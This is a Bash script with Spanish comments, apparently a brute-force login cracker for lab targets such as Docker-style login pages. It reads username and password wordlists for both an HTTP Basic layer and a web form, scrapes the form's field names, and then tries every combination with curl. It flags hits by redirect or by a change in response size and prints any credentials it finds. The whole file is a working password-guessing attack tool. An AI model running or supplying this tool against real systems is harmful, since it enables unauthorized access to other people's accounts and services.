#!/bin/bash

# Códigos de colores ANSI
VERDE="\033[0;32m"
ROJO="\033[0;31m"
AMARILLO="\033[1;33m"
AZUL="\033[0;34m"
CYAN="\033[0;36m"
RESET="\033[0m"
NEGRITA="\033[1m"

imprimir_banner() {
    echo -e "${AMARILLO}${NEGRITA}"
    echo "      ██████  ███████ ███████  █████  ███████ ███████  ██████  "
    echo "        ██    ██      ██      ██   ██      ██      ██ ██    ██ "
    echo "        ██    █████   █████   ███████   ███     ███   ██    ██ "
    echo "  ██    ██    ██      ██      ██   ██  ██      ██     ██    ██ "
    echo "   ██████     ███████ ██      ██   ██ ███████ ███████  ██████  "
    echo "                                                               "
    echo "                      [ BASH ADAPTATIVE EDITION ]"
    echo -e "${RESET}"
}

configurar_parametro() {
    local nombre=$1
    local contexto=$2
    echo -e "\n${CYAN} Configuración para $nombre ($contexto):${RESET}"
    echo "  1) Introducir un único valor manual"
    echo "  2) Cargar desde una Wordlist (Archivo)"
    read -p "Selecciona una opción (1 o 2): " opcion

    if [[ "$opcion" == "1" ]]; then
        read -p "Introduce el valor manual: " valor
        echo "$valor" > "/tmp/param_${nombre}.txt"
    elif [[ "$opcion" == "2" ]]; then
        read -p "Introduce la ruta de la Wordlist: " ruta
        if [[ ! -f "$ruta" ]]; then
            echo -e "${ROJO}[-] El archivo no existe.${RESET}"
            exit 1
        fi
        cp "$ruta" "/tmp/param_${nombre}.txt"
    else
        echo -e "${ROJO}[-] Opción inválida.${RESET}"
        exit 1
    fi
}

imprimir_banner

echo -e "${CYAN}--- Configuración del Objetivo ---${RESET}"
read -p "Introduce la URL de destino (ej. http://172.17.0.2/login.php): " URL

# --- FASE 1: CAPA DE RED (HTTP BASIC) ---
echo -e "\n${AMARILLO}[!] Fase 1: Credenciales para la capa de Red (HTTP Basic)${RESET}"
configurar_parametro "user_basic" "HTTP Basic"
configurar_parametro "pass_basic" "HTTP Basic"

# --- FASE 2: CAPA DE APLICACIÓN (FORMULARIO) ---
echo -e "\n${AMARILLO}[!] Fase 2: Credenciales para el Formulario Web (POST)${RESET}"
configurar_parametro "user_form" "Formulario POST"
configurar_parametro "pass_form" "Formulario POST"

echo -e "\n${AZUL}[*] Analizando la estructura del formulario en la página web...${RESET}"

# Intentar extraer el formulario de manera automatizada usando expresiones regulares sobre el HTML
# Buscamos el contenido web pasando una de las combinaciones HTTP basic iniciales
U_B_CTRL=$(head -n 1 /tmp/param_user_basic.txt)
P_B_CTRL=$(head -n 1 /tmp/param_pass_basic.txt)

HTML_CONTENT=$(curl -s -u "$U_B_CTRL:$P_B_CTRL" "$URL")

# Detección automatizada de los atributos 'name' de los inputs
CAMPO_USER=$(echo "$HTML_CONTENT" | grep -oE 'name=["'\''][^"'\'' ]*["'\'']' | grep -E 'user|mail|login|txt' | head -n 1 | cut -d'"' -f2 | cut -d"'" -f2)
CAMPO_PASS=$(echo "$HTML_CONTENT" | grep -oE 'name=["'\''][^"'\'' ]*["'\'']' | grep -E 'pass|pwd' | head -n 1 | cut -d'"' -f2 | cut -d"'" -f2)

# Valores por defecto si falla el parsing regex
CAMPO_USER=${CAMPO_USER:-"username"}
CAMPO_PASS=${CAMPO_PASS:-"password"}

echo -e "${VERDE}[+] Componentes identificados automáticamente:${RESET}"
echo -e "    -> Campo de Usuario: ${AMARILLO}$CAMPO_USER${RESET}"
echo -e "    -> Campo de Contraseña: ${AMARILLO}$CAMPO_PASS${RESET}"
echo -e "${AZUL}[*] Iniciando procesamiento cruzado... (Modo silencioso)${RESET}"
echo "-----------------------------------------------------------------"

# Obtener tamaño de respuesta fallida de control
CTRL_RESP=$(curl -s -w "%{size_download}" -o /dev/null -u "$U_B_CTRL:$P_B_CTRL" -X POST "$URL" -d "${CAMPO_USER}=no_user_123&${CAMPO_PASS}=no_pass_123")

ENCONTRADO=0

# Bucles de procesamiento cruzado nativos de Bash
while read -r B_USER; do
    while read -r B_PASS; do
        while read -r F_USER; do
            while read -r F_PASS; do
                
                # Ejecución de curl capturando código de estado, redirección y tamaño
                # Usamos --max-time para evitar cuelgues de red
                DATA_PAYLOAD="${CAMPO_USER}=${F_USER}&${CAMPO_PASS}=${F_PASS}"
                CURL_OUT=$(curl -s -w "%{http_code} %{size_download} %{redirect_url}" -o /dev/null -u "$B_USER:$B_PASS" -X POST "$URL" -d "$DATA_PAYLOAD" --max-time 3)
                
                HTTP_CODE=$(echo "$CURL_OUT" | cut -d' ' -f1)
                SIZE=$(echo "$CURL_OUT" | cut -d' ' -f2)
                RED_URL=$(echo "$CURL_OUT" | cut -d' ' -f3)

                ES_VALIDO=0
                # Criterio 1: Redirección (301, 302, 307)
                if [[ "$HTTP_CODE" =~ ^3[0-9][0-9]$ ]] || [[ -n "$RED_URL" ]]; then
                    ES_VALIDO=1
                # Criterio 2: Cambio drástico en la longitud de descarga respecto al control defectuoso
                elif [[ "$HTTP_CODE" == "200" ]] && [[ "$SIZE" != "$CTRL_RESP" ]]; then
                    ES_VALIDO=1
                fi

                if [[ "$ES_VALIDO" -eq 1 ]]; then
                    echo -e "\n${VERDE}${NEGRITA}[¡!] CREDENCIALES COMPLETAS ENCONTRADAS:${RESET}"
                    echo -e "    ${AMARILLO}-> Infraestructura (HTTP Basic):${RESET} $B_USER:$B_PASS"
                    echo -e "    ${AMARILLO}-> Aplicación (Formulario POST):${RESET} $F_USER:$F_PASS"
                    echo -e "    -> Código: $HTTP_CODE | Tamaño: $SIZE bytes"
                    ENCONTRADO=1
                fi

            done < /tmp/param_pass_form.txt
        done < /tmp/param_user_form.txt
    done < /tmp/param_pass_basic.txt
done < /tmp/param_user_basic.txt

echo "-----------------------------------------------------------------"
# Limpieza de temporales
rm -f /tmp/param_*.txt

if [[ "$ENCONTRADO" -eq 0 ]]; then
    echo -e "${ROJO}${NEGRITA}[-] No se encontraron combinaciones válidas en los diccionarios.${RESET}\n"
else
    echo -e "${VERDE}${NEGRITA}[+] Proceso finalizado exitosamente.${RESET}\n"
fi
